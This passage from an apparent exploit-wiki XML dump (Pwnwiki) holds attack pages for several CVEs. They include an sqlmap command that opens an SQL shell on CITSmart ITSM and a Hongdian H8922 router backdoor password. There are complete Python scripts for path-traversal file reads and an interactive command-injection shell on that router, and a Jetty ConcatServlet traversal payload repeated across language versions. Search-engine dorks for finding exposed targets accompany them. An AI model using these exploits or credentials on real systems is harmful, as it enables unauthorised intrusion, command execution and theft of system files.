https://www.okta.com/security-advisories/cve-2021-28113/
&lt;/pre&gt;</text>
      <sha1>mkdb3sn3y1m73ybgp51cbmgqjrye6di</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28142 CITSmart ITSM 9.1.2.27 - 'query' SQL注入漏洞</title>
    <ns>0</ns>
    <id>1322</id>
    <revision>
      <id>1662</id>
      <timestamp>2021-04-14T08:58:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP==  &lt;pre&gt; # Exploit Title: CITSmart ITSM 9.1.2.27 - 'query' Time-based Blind SQL Injection (Authenticated) # Google Dork: "citsmart.local" # Date: 11/03/2021 # Exploit Au..."</comment>
      <origin>1662</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1061" sha1="mj5zs5g32dz2eic9ns339czapnujyy2" xml:space="preserve">==EXP==

&lt;pre&gt;
# Exploit Title: CITSmart ITSM 9.1.2.27 - 'query' Time-based Blind SQL Injection (Authenticated)
# Google Dork: "citsmart.local"
# Date: 11/03/2021
# Exploit Author: skysbsb
# Vendor Homepage: https://docs.citsmart.com/pt-br/citsmart-platform-9/get-started/about-citsmart/release-notes.html
# Version: &lt; 9.1.2.28
# CVE : CVE-2021-28142

To exploit this flaw it is necessary to be authenticated.

URL vulnerable:
https://vulnsite.com/citsmart/pages/smartPortal/pages/autoCompletePortal/autoCompletePortal.load?idPortfolio=&amp;idServico=&amp;query=fale
Param vulnerable: query

Sqlmap usage:  sqlmap -u "
https://vulnsite.com/citsmart/pages/smartPortal/pages/autoCompletePortal/autoCompletePortal.load?idPortfolio=&amp;idServico=&amp;query=fale" --cookie 'JSESSIONID=xxx' --time-sec 1 --prefix "')" --suffix "AND ('abc%'='abc" --sql-shell

Affected versions: &lt; 9.1.2.28
Fixed versions: &gt;= 9.1.2.28

Vendor has acknowledge this vulnerability at ticket 11216 (https://docs.citsmart.com/pt-br/citsmart-platform-9/get-started/about-citsmart/release-notes.html)
&lt;/pre&gt;</text>
      <sha1>mj5zs5g32dz2eic9ns339czapnujyy2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28149 CVE-2021-28150 CVE-2021-28151 宏電 H8922 多個漏洞</title>
    <ns>0</ns>
    <id>1551</id>
    <revision>
      <id>1934</id>
      <timestamp>2021-04-29T05:21:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==ZoomEye== &lt;pre&gt; app:"Hongdian H8922 Industrial Router &lt;/pre&gt;  ==宏電 H8922 Telnet後門漏洞== 使用Telnet連接目標5188端口，賬號密碼為&lt;code&gt;root/superzxmn&lt;/c..."</comment>
      <origin>1934</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9719" sha1="bzawc522jzi1pjnim8yvlfoydglo6u5" xml:space="preserve">==ZoomEye==
&lt;pre&gt;
app:"Hongdian H8922 Industrial Router
&lt;/pre&gt;

==宏電 H8922 Telnet後門漏洞==
使用Telnet連接目標5188端口，賬號密碼為&lt;code&gt;root/superzxmn&lt;/code&gt;

==宏電 H8922 後台任意文件讀取漏洞==
登錄後台(存在訪客用戶默認賬號密碼 guest/guest)

===POC===
&lt;pre&gt;

import requests
import sys
import random
import re
from lxml import etree
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152                 \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, filename):
    vuln_url = target_url + "/log_download.cgi?type=../..{}".format(filename)
    headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/log_download.cgi?type=../../etc/passwd \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取 /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                filename = input("\033[35mFilename &gt;&gt;&gt; \033[0m")
                if filename == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, filename)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, filename):
    vuln_url = target_url + "/log_download.cgi?type=../..{}".format(filename)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] {} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    filename = '/etc/passwd'
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, filename)
&lt;/pre&gt;


==宏電 H8922 後台命令執行漏洞==
登錄後台(存在訪客用戶默認賬號密碼 guest/guest)
使用 ; 命令拼接執行任意命令

&lt;pre&gt;

POST /tools.cgi HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 96
Cache-Control: max-age=0
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

op_type=ping&amp;destination=;cat /etc/passwd&amp;user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A
&lt;/pre&gt;

===POC===
&lt;pre&gt;

import requests
import sys
import random
import re
from lxml import etree
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 宏电 H8922 后台命令执行漏洞 CVE-2021-28150                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, cmd):
    vuln_url = target_url + "/tools.cgi"
    headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    data = "op_type=ping&amp;destination=;cat /etc/passwd&amp;user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/tools.cgi \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功执行 cat /etc/passwd \033[0m".format(target_url))
            html = etree.HTML(response.text)
            cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0]
            print("\033[32m[o] 响应为:\n{} \033[0m".format(cmd_test))
            while True:
                cmd = input("\033[35mCmd &gt;&gt;&gt; \033[0m")
                if cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, cmd)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/tools.cgi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    data = "op_type=ping&amp;destination=;{}&amp;user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        html = etree.HTML(response.text)
        cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0]
        print("\033[32m[o] 响应为:\n{} \033[0m".format(cmd_test))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    cmd = 'cat /etc/passwd'
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, cmd)
&lt;/pre&gt;

==宏電 H8922 後台管理員信息洩露漏洞==
登錄後台(存在訪客用戶默認賬號密碼 guest/guest)
漏洞存在於 backup2.cgi 文件中

===POC===
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 宏电 H8922 后台命令执行漏洞 CVE-2021-28150                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/backup2.cgi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/backup2.cgi.... \033[0m".format(target_url))
        if 'service webadmin' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取配置文件 \033[0m".format(target_url))
            print("\033[36m[o] 响应为:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
&lt;/pre&gt;

==參考==
https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/

https://mp.weixin.qq.com/s/7lJkAb6M0nctv415juYPww</text>
      <sha1>bzawc522jzi1pjnim8yvlfoydglo6u5</sha1>
    </revision>
    <revision>
      <id>1935</id>
      <parentid>1934</parentid>
      <timestamp>2021-04-29T05:24:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* ZoomEye */</comment>
      <origin>1935</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9720" sha1="7zxzbobprwg5dz9mnmvfg83pcxecv3o" xml:space="preserve">==ZoomEye==
&lt;pre&gt;
app:"Hongdian H8922 Industrial Router"
&lt;/pre&gt;

==宏電 H8922 Telnet後門漏洞==
使用Telnet連接目標5188端口，賬號密碼為&lt;code&gt;root/superzxmn&lt;/code&gt;

==宏電 H8922 後台任意文件讀取漏洞==
登錄後台(存在訪客用戶默認賬號密碼 guest/guest)

===POC===
&lt;pre&gt;

import requests
import sys
import random
import re
from lxml import etree
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152                 \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, filename):
    vuln_url = target_url + "/log_download.cgi?type=../..{}".format(filename)
    headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/log_download.cgi?type=../../etc/passwd \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取 /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                filename = input("\033[35mFilename &gt;&gt;&gt; \033[0m")
                if filename == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, filename)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, filename):
    vuln_url = target_url + "/log_download.cgi?type=../..{}".format(filename)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] {} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    filename = '/etc/passwd'
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, filename)
&lt;/pre&gt;


==宏電 H8922 後台命令執行漏洞==
登錄後台(存在訪客用戶默認賬號密碼 guest/guest)
使用 ; 命令拼接執行任意命令

&lt;pre&gt;

POST /tools.cgi HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 96
Cache-Control: max-age=0
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

op_type=ping&amp;destination=;cat /etc/passwd&amp;user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A
&lt;/pre&gt;

===POC===
&lt;pre&gt;

import requests
import sys
import random
import re
from lxml import etree
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 宏电 H8922 后台命令执行漏洞 CVE-2021-28150                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, cmd):
    vuln_url = target_url + "/tools.cgi"
    headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    data = "op_type=ping&amp;destination=;cat /etc/passwd&amp;user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/tools.cgi \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功执行 cat /etc/passwd \033[0m".format(target_url))
            html = etree.HTML(response.text)
            cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0]
            print("\033[32m[o] 响应为:\n{} \033[0m".format(cmd_test))
            while True:
                cmd = input("\033[35mCmd &gt;&gt;&gt; \033[0m")
                if cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, cmd)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/tools.cgi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    data = "op_type=ping&amp;destination=;{}&amp;user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        html = etree.HTML(response.text)
        cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0]
        print("\033[32m[o] 响应为:\n{} \033[0m".format(cmd_test))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    cmd = 'cat /etc/passwd'
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, cmd)
&lt;/pre&gt;

==宏電 H8922 後台管理員信息洩露漏洞==
登錄後台(存在訪客用戶默認賬號密碼 guest/guest)
漏洞存在於 backup2.cgi 文件中

===POC===
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 宏电 H8922 后台命令执行漏洞 CVE-2021-28150                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/backup2.cgi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/backup2.cgi.... \033[0m".format(target_url))
        if 'service webadmin' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取配置文件 \033[0m".format(target_url))
            print("\033[36m[o] 响应为:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
&lt;/pre&gt;

==參考==
https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/

https://mp.weixin.qq.com/s/7lJkAb6M0nctv415juYPww</text>
      <sha1>7zxzbobprwg5dz9mnmvfg83pcxecv3o</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞</title>
    <ns>0</ns>
    <id>3742</id>
    <revision>
      <id>4351</id>
      <timestamp>2021-06-09T08:53:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; &lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2 &lt;/pre&gt;  ==Payload== &lt;pre&gt; /concat?/%2557EB-INF/web.xml &lt;/pre&gt;"</comment>
      <origin>4351</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="156" sha1="g0bjc9ciirb59szdo906xvjjcwlfj2d" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>g0bjc9ciirb59szdo906xvjjcwlfj2d</sha1>
    </revision>
    <revision>
      <id>4352</id>
      <parentid>4351</parentid>
      <timestamp>2021-06-09T08:53:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4352</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="167" sha1="iiefed42ckb5kdl2o14brtui4io3aqb" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>iiefed42ckb5kdl2o14brtui4io3aqb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/ar</title>
    <ns>0</ns>
    <id>3769</id>
    <revision>
      <id>4380</id>
      <timestamp>2021-06-09T09:48:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28169 Jetty Utility Servlets ثغرة أمنية في الكشف عن معلومات ConcatServlet"</comment>
      <origin>4380</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="150" sha1="ihg3gp7jb7km6t2rqhv6ggpoatws7zz" xml:space="preserve">&lt;languages /&gt;

== الإصدار المتأثر ==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>ihg3gp7jb7km6t2rqhv6ggpoatws7zz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/de</title>
    <ns>0</ns>
    <id>3867</id>
    <revision>
      <id>4478</id>
      <timestamp>2021-06-09T11:35:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Betroffene Version =="</comment>
      <origin>4478</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="139" sha1="hcaovmwqqykku8253dp44qx3lf7af0r" xml:space="preserve">&lt;languages /&gt;

== Betroffene Version ==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>hcaovmwqqykku8253dp44qx3lf7af0r</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/en</title>
    <ns>0</ns>
    <id>3747</id>
    <revision>
      <id>4357</id>
      <timestamp>2021-06-09T09:38:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28169 Jetty Utility Servlets ConcatServlet Information Disclosure Vulnerability"</comment>
      <origin>4357</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="136" sha1="kb4voaavhzfa7ux3tcitsl5covfeu34" xml:space="preserve">&lt;languages /&gt;

==Affected Versions==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>kb4voaavhzfa7ux3tcitsl5covfeu34</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/es</title>
    <ns>0</ns>
    <id>3757</id>
    <revision>
      <id>4368</id>
      <timestamp>2021-06-09T09:44:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versión afectada =="</comment>
      <origin>4368</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="138" sha1="pgmlq663q6u5k8d25ir323aaujifcsm" xml:space="preserve">&lt;languages /&gt;

== Versión afectada ==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>pgmlq663q6u5k8d25ir323aaujifcsm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/fr</title>
    <ns>0</ns>
    <id>3860</id>
    <revision>
      <id>4471</id>
      <timestamp>2021-06-09T10:27:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Version affectée=="</comment>
      <origin>4471</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="136" sha1="rdkiu613ic9tr383enoe8vn9cctsk4f" xml:space="preserve">&lt;languages /&gt;

==Version affectée==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>rdkiu613ic9tr383enoe8vn9cctsk4f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/he</title>
    <ns>0</ns>
    <id>3805</id>
    <revision>
      <id>4416</id>
      <timestamp>2021-06-09T09:55:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28169 פגיעות גילוי מידע בגישה למזחונים"</comment>
      <origin>4416</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="140" sha1="bxl0sja9z4p6hdnl0ib7nbyu7tsngo3" xml:space="preserve">&lt;languages /&gt;

==גרסה מושפעת==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>bxl0sja9z4p6hdnl0ib7nbyu7tsngo3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/pt</title>
    <ns>0</ns>
    <id>3863</id>
    <revision>
      <id>4474</id>
      <timestamp>2021-06-09T10:41:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versão afetada =="</comment>
      <origin>4474</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="136" sha1="7dv9wxgg79rda6eplrcfqcvyyzt7r2n" xml:space="preserve">&lt;languages /&gt;

== Versão afetada ==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>7dv9wxgg79rda6eplrcfqcvyyzt7r2n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/ru</title>
    <ns>0</ns>
    <id>3758</id>
    <revision>
      <id>4369</id>
      <timestamp>2021-06-09T09:44:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
